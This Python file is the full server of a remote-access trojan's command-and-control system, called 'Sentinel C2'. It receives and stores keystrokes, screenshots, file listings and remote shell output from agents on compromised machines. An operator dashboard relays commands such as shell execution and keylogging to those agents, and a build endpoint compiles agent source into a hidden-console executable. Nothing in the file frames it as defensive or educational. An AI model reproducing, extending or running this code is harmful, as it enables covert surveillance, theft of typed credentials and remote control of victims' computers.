#!/usr/bin/env python3
"""
Sentinel C2 Server
------------------
WebSocket listener  : ws://0.0.0.0:4444   (agents connect here)
REST API + WS panel : http://0.0.0.0:8080  (dashboard connects here)

Protocol (agent ↔ server, JSON frames):
  agent → server:
    {"type":"hello",   "id":"<uuid>", "hostname":"...", "os":"...", "user":"...", "ip":"..."}
    {"type":"keylog",  "id":"<uuid>", "data":"<chunk>"}
    {"type":"screen",  "id":"<uuid>", "data":"<base64-png>"}
    {"type":"files",   "id":"<uuid>", "path":"...", "entries":[...]}
    {"type":"shell",   "id":"<uuid>", "seq":<int>, "data":"<stdout/stderr>"}

  server → agent:
    {"cmd":"screen"}
    {"cmd":"files",   "path":"C:\\"}
    {"cmd":"shell",   "data":"whoami\n"}
    {"cmd":"kill"}
    {"cmd":"keylog_start"} / {"cmd":"keylog_stop"}

  dashboard ↔ server (ws://localhost:8080/ws):
    server → dash:   any agent frame forwarded verbatim + {"type":"agent_list",...}
    dash → server:   {"target":"<agent-id>", "cmd":"...", ...}
"""

import asyncio
import json
import logging
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import time
import uuid
from pathlib import Path
from typing import Dict, Optional

import websockets
from websockets.server import WebSocketServerProtocol
from aiohttp import web

# ─────────────────────────────────────────────
#  Config
# ─────────────────────────────────────────────
AGENT_HOST  = "0.0.0.0"
AGENT_PORT  = 4444          # agents connect here
DASH_HOST   = "0.0.0.0"
DASH_PORT   = 8080          # dashboard REST + WS

DB_PATH     = Path("sentinel.db")
LOG_LEVEL   = logging.DEBUG

# ─────────────────────────────────────────────
#  Logging
# ─────────────────────────────────────────────
logging.basicConfig(
    level=LOG_LEVEL,
    format="[%(asctime)s] %(levelname)-8s %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("sentinel")

# ─────────────────────────────────────────────
#  In-memory state
# ─────────────────────────────────────────────
# agent_id → {ws, meta, last_seen, keylog_buf, last_screen}
agents: Dict[str, dict] = {}

# dashboard WebSocket connections
dash_sockets: set = set()

# ─────────────────────────────────────────────
#  Database
# ─────────────────────────────────────────────
def db_init():
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.executescript("""
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            os TEXT,
            user TEXT,
            ip TEXT,
            first_seen INTEGER,
            last_seen INTEGER
        );
        CREATE TABLE IF NOT EXISTS keylog (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            ts INTEGER,
            data TEXT
        );
        CREATE TABLE IF NOT EXISTS screens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            ts INTEGER,
            png_b64 TEXT
        );
        CREATE TABLE IF NOT EXISTS shell_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            ts INTEGER,
            seq INTEGER,
            data TEXT
        );
    """)
    con.commit()
    con.close()
    log.info(f"DB ready at {DB_PATH}")

def db_upsert_agent(meta: dict):
    con = sqlite3.connect(DB_PATH)
    now = int(time.time())
    con.execute("""
        INSERT INTO agents (id,hostname,os,user,ip,first_seen,last_seen)
        VALUES (?,?,?,?,?,?,?)
        ON CONFLICT(id) DO UPDATE SET
          hostname=excluded.hostname, os=excluded.os,
          user=excluded.user, ip=excluded.ip,
          last_seen=excluded.last_seen
    """, (meta["id"], meta.get("hostname","?"), meta.get("os","?"),
          meta.get("user","?"), meta.get("ip","?"), now, now))
    con.commit()
    con.close()

def db_touch_agent(agent_id: str):
    con = sqlite3.connect(DB_PATH)
    con.execute("UPDATE agents SET last_seen=? WHERE id=?",
                (int(time.time()), agent_id))
    con.commit()
    con.close()

def db_save_keylog(agent_id: str, data: str):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO keylog (agent_id,ts,data) VALUES (?,?,?)",
                (agent_id, int(time.time()), data))
    con.commit()
    con.close()

def db_save_screen(agent_id: str, png_b64: str):
    con = sqlite3.connect(DB_PATH)
    # keep last 20 screens per agent
    con.execute("""
        DELETE FROM screens WHERE agent_id=? AND id NOT IN (
            SELECT id FROM screens WHERE agent_id=? ORDER BY id DESC LIMIT 19
        )
    """, (agent_id, agent_id))
    con.execute("INSERT INTO screens (agent_id,ts,png_b64) VALUES (?,?,?)",
                (agent_id, int(time.time()), png_b64))
    con.commit()
    con.close()

def db_save_shell(agent_id: str, seq: int, data: str):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO shell_log (agent_id,ts,seq,data) VALUES (?,?,?,?)",
                (agent_id, int(time.time()), seq, data))
    con.commit()
    con.close()

def db_get_agents():
    con = sqlite3.connect(DB_PATH)
    rows = con.execute(
        "SELECT id,hostname,os,user,ip,first_seen,last_seen FROM agents"
    ).fetchall()
    con.close()
    return [dict(zip(["id","hostname","os","user","ip","first_seen","last_seen"], r))
            for r in rows]

def db_get_keylog(agent_id: str, limit=200):
    con = sqlite3.connect(DB_PATH)
    rows = con.execute(
        "SELECT ts,data FROM keylog WHERE agent_id=? ORDER BY id DESC LIMIT ?",
        (agent_id, limit)
    ).fetchall()
    con.close()
    return [{"ts": r[0], "data": r[1]} for r in rows]

def db_get_screen(agent_id: str):
    con = sqlite3.connect(DB_PATH)
    row = con.execute(
        "SELECT ts,png_b64 FROM screens WHERE agent_id=? ORDER BY id DESC LIMIT 1",
        (agent_id,)
    ).fetchone()
    con.close()
    return {"ts": row[0], "png_b64": row[1]} if row else None

def db_get_shell(agent_id: str, limit=500):
    con = sqlite3.connect(DB_PATH)
    rows = con.execute(
        "SELECT ts,seq,data FROM shell_log WHERE agent_id=? ORDER BY id DESC LIMIT ?",
        (agent_id, limit)
    ).fetchall()
    con.close()
    return [{"ts": r[0], "seq": r[1], "data": r[2]} for r in rows]

# ─────────────────────────────────────────────
#  Dashboard broadcast
# ─────────────────────────────────────────────
async def broadcast_dash(msg: dict):
    """Push a JSON frame to all connected dashboard clients."""
    if not dash_sockets:
        return
    raw = json.dumps(msg)
    dead = set()
    for ws in dash_sockets:
        try:
            await ws.send_str(raw)
        except Exception:
            dead.add(ws)
    dash_sockets.difference_update(dead)

# ─────────────────────────────────────────────
#  Agent WebSocket handler  (port 4444)
# ─────────────────────────────────────────────
async def handle_agent(ws: WebSocketServerProtocol):
    agent_id: Optional[str] = None
    remote   = ws.remote_address
    log.info(f"Agent connected from {remote}")

    try:
        async for raw in ws:
            try:
                frame = json.loads(raw)
            except json.JSONDecodeError:
                continue

            ftype = frame.get("type")
            agent_id = frame.get("id") or agent_id

            # ── HELLO ──────────────────────────────────────────
            if ftype == "hello":
                agent_id = frame.get("id", str(uuid.uuid4()))
                meta = {**frame, "id": agent_id}
                agents[agent_id] = {
                    "ws": ws,
                    "meta": meta,
                    "last_seen": time.time(),
                }
                db_upsert_agent(meta)
                log.info(f"  [+] Agent hello: {meta.get('hostname')} ({agent_id[:8]})")
                await broadcast_dash({"type": "agent_connect", **meta})
                # send updated agent list
                await broadcast_dash({
                    "type": "agent_list",
                    "agents": _agent_list_payload()
                })

            # ── KEYLOG ─────────────────────────────────────────
            elif ftype == "keylog":
                data = frame.get("data", "")
                db_save_keylog(agent_id, data)
                db_touch_agent(agent_id)
                if agent_id in agents:
                    agents[agent_id]["last_seen"] = time.time()
                    agents[agent_id].setdefault("keylog_buf", []).append(data)
                await broadcast_dash({"type": "keylog", "id": agent_id, "data": data})

            # ── SCREEN ─────────────────────────────────────────
            elif ftype == "screen":
                png_b64 = frame.get("data", "")
                db_save_screen(agent_id, png_b64)
                db_touch_agent(agent_id)
                if agent_id in agents:
                    agents[agent_id]["last_screen"] = png_b64
                    agents[agent_id]["last_seen"] = time.time()
                # forward to dashboard (potentially large — only active viewers)
                await broadcast_dash({"type": "screen", "id": agent_id, "data": png_b64})

            # ── FILES ──────────────────────────────────────────
            elif ftype == "files":
                db_touch_agent(agent_id)
                await broadcast_dash({
                    "type": "files",
                    "id": agent_id,
                    "path": frame.get("path", "/"),
                    "entries": frame.get("entries", [])
                })

            # ── SHELL OUTPUT ───────────────────────────────────
            elif ftype == "shell":
                seq  = frame.get("seq", 0)
                data = frame.get("data", "")
                db_save_shell(agent_id, seq, data)
                db_touch_agent(agent_id)
                await broadcast_dash({"type": "shell", "id": agent_id,
                                      "seq": seq, "data": data})

            else:
                # forward any other frame type (steal, steal_ack, self_destruct_ack,
                # wallpaper_ack, exec_result, keylog_flush, etc.) straight to dashboard
                if agent_id:
                    db_touch_agent(agent_id)
                    if agent_id in agents:
                        agents[agent_id]["last_seen"] = time.time()
                await broadcast_dash(frame)
                log.debug(f"Forwarded frame type '{ftype}' from {agent_id}")

    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        log.error(f"Agent handler error: {e}", exc_info=True)
    finally:
        if agent_id and agent_id in agents:
            del agents[agent_id]
            log.info(f"  [-] Agent disconnected: {agent_id[:8]}")
            await broadcast_dash({
                "type": "agent_disconnect",
                "id": agent_id
            })
            await broadcast_dash({
                "type": "agent_list",
                "agents": _agent_list_payload()
            })

# ─────────────────────────────────────────────
#  Dashboard aiohttp app  (port 8080)
# ─────────────────────────────────────────────
async def dash_ws_handler(request: web.Request):
    """Dashboard WebSocket — bidirectional, used for live feed + commands."""
    ws = web.WebSocketResponse()
    await ws.prepare(request)
    dash_sockets.add(ws)
    log.info("Dashboard client connected")

    # immediately push current agent list
    await ws.send_str(json.dumps({
        "type": "agent_list",
        "agents": _agent_list_payload()
    }))

    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                try:
                    cmd_frame = json.loads(msg.data)
                except json.JSONDecodeError:
                    continue
                await _dispatch_dashboard_cmd(cmd_frame)
            elif msg.type in (web.WSMsgType.ERROR, web.WSMsgType.CLOSE):
                break
    finally:
        dash_sockets.discard(ws)
        log.info("Dashboard client disconnected")

    return ws

async def _dispatch_dashboard_cmd(frame: dict):
    """Route a command from the dashboard to the right agent."""
    target = frame.get("target")  # agent id
    cmd    = frame.get("cmd")

    if not target or not cmd:
        return

    entry = agents.get(target)
    if not entry:
        log.warning(f"CMD for unknown agent {target}")
        return

    agent_ws: WebSocketServerProtocol = entry["ws"]
    # forward the full frame to the agent (drop 'target' key — agent doesn't need it)
    out = {k: v for k, v in frame.items() if k != "target"}

    try:
        await agent_ws.send(json.dumps(out))
        log.debug(f"Relayed cmd='{cmd}' to agent {target[:8]}")
    except Exception as e:
        log.error(f"Failed to relay cmd to agent: {e}")

# ── REST endpoints ──────────────────────────────────────────────────────────
async def rest_agents(request):
    return web.json_response({"agents": db_get_agents()})

async def rest_keylog(request):
    aid = request.match_info["agent_id"]
    return web.json_response({"entries": db_get_keylog(aid)})

async def rest_screen(request):
    aid = request.match_info["agent_id"]
    data = db_get_screen(aid)
    if data:
        return web.json_response(data)
    return web.json_response({"error": "no screen"}, status=404)

async def rest_shell(request):
    aid = request.match_info["agent_id"]
    return web.json_response({"log": db_get_shell(aid)})

async def cors_middleware(app, handler):
    async def middleware(request):
        if request.method == "OPTIONS":
            return web.Response(headers={
                "Access-Control-Allow-Origin":  "*",
                "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
                "Access-Control-Allow-Headers": "Content-Type",
            })
        resp = await handler(request)
        resp.headers["Access-Control-Allow-Origin"]  = "*"
        resp.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return resp
    return middleware

# ── /build endpoint ─────────────────────────────────────────────────────────
async def rest_build(request: web.Request):
    """
    POST /build
    Body (JSON):
        { "source": "<python source code>", "exe_name": "myrat" }

    Runs PyInstaller on the server, returns the .exe as binary download.
    Requires: pip install pyinstaller  (on the machine running c2_server.py)
    """
    try:
        body = await request.json()
    except Exception:
        return web.json_response({"error": "invalid JSON body"}, status=400)

    source   = body.get("source", "")
    exe_name = body.get("exe_name", "agent").strip().replace(" ", "_") or "agent"
    # sanitize exe_name: alphanumeric + _ + -
    exe_name = "".join(c for c in exe_name if c.isalnum() or c in ("_", "-")) or "agent"

    if not source:
        return web.json_response({"error": "no source provided"}, status=400)

    # verify PyInstaller importable via the SAME python that runs this server
    # (shutil.which misses it when Scripts/ isn't in PATH — use importlib instead)
    import importlib.util
    if importlib.util.find_spec("PyInstaller") is None:
        return web.json_response({
            "error": f"PyInstaller not found. Run: {sys.executable} -m pip install pyinstaller"
        }, status=500)

    # build in temp dir
    build_dir = Path(tempfile.mkdtemp(prefix="sentinel_build_"))
    try:
        src_path = build_dir / "agent.py"
        src_path.write_text(source, encoding="utf-8")

        log.info(f"[BUILD] Starting PyInstaller for '{exe_name}' in {build_dir}")

        result = subprocess.run(
            [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--noconsole",
                f"--name={exe_name}",
                "--distpath", str(build_dir / "dist"),
                "--workpath", str(build_dir / "work"),
                "--specpath", str(build_dir),
                str(src_path),
            ],
            capture_output=True,
            text=True,
            timeout=300,   # 5 min max
            cwd=str(build_dir),
        )

        exe_path = build_dir / "dist" / f"{exe_name}.exe"
        if not exe_path.exists():
            # try without .exe (Linux build)
            exe_path_nox = build_dir / "dist" / exe_name
            if exe_path_nox.exists():
                exe_path = exe_path_nox

        if not exe_path.exists():
            log.error(f"[BUILD] Failed. stdout:\n{result.stdout[-2000:]}\nstderr:\n{result.stderr[-2000:]}")
            return web.json_response({
                "error": "Build failed — PyInstaller output below",
                "stdout": result.stdout[-3000:],
                "stderr": result.stderr[-3000:],
            }, status=500)

        log.info(f"[BUILD] Success → {exe_path} ({exe_path.stat().st_size // 1024} KB)")

        exe_bytes = exe_path.read_bytes()
        return web.Response(
            body=exe_bytes,
            content_type="application/octet-stream",
            headers={
                "Content-Disposition": f'attachment; filename="{exe_name}.exe"',
                "X-Build-Size": str(len(exe_bytes)),
            }
        )

    except subprocess.TimeoutExpired:
        return web.json_response({"error": "Build timed out (>5 min)"}, status=500)
    except Exception as e:
        log.error(f"[BUILD] Exception: {e}", exc_info=True)
        return web.json_response({"error": str(e)}, status=500)
    finally:
        # cleanup temp dir
        try:
            shutil.rmtree(build_dir, ignore_errors=True)
        except Exception:
            pass

def build_dash_app():
    app = web.Application(middlewares=[cors_middleware])
    app.router.add_get    ("/ws",                    dash_ws_handler)
    app.router.add_get    ("/api/agents",            rest_agents)
    app.router.add_get    ("/api/keylog/{agent_id}", rest_keylog)
    app.router.add_get    ("/api/screen/{agent_id}", rest_screen)
    app.router.add_get    ("/api/shell/{agent_id}",  rest_shell)
    app.router.add_post   ("/build",                 rest_build)
    app.router.add_options("/build",                 lambda r: web.Response())
    return app

# ─────────────────────────────────────────────
#  Helpers
# ─────────────────────────────────────────────
def _agent_list_payload():
    now = time.time()
    result = []
    for aid, entry in agents.items():
        m = entry["meta"]
        result.append({
            "id":        aid,
            "hostname":  m.get("hostname", "?"),
            "os":        m.get("os", "?"),
            "user":      m.get("user", "?"),
            "ip":        m.get("ip", "?"),
            "last_seen": round(now - entry.get("last_seen", now), 1),
            "online":    True
        })
    return result

# ─────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────
async def main():
    db_init()

    # Agent WebSocket server
    agent_server = await websockets.serve(
        handle_agent,
        AGENT_HOST,
        AGENT_PORT,
        ping_interval=20,
        ping_timeout=30
    )
    log.info(f"Agent listener on ws://{AGENT_HOST}:{AGENT_PORT}")

    # Dashboard HTTP/WS server
    dash_app = build_dash_app()
    runner   = web.AppRunner(dash_app)
    await runner.setup()
    site = web.TCPSite(runner, DASH_HOST, DASH_PORT)
    await site.start()
    log.info(f"Dashboard API on http://{DASH_HOST}:{DASH_PORT}")

    log.info("Sentinel C2 running — Ctrl+C to stop")
    try:
        await asyncio.Future()   # run forever
    except asyncio.CancelledError:
        pass
    finally:
        agent_server.close()
        await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
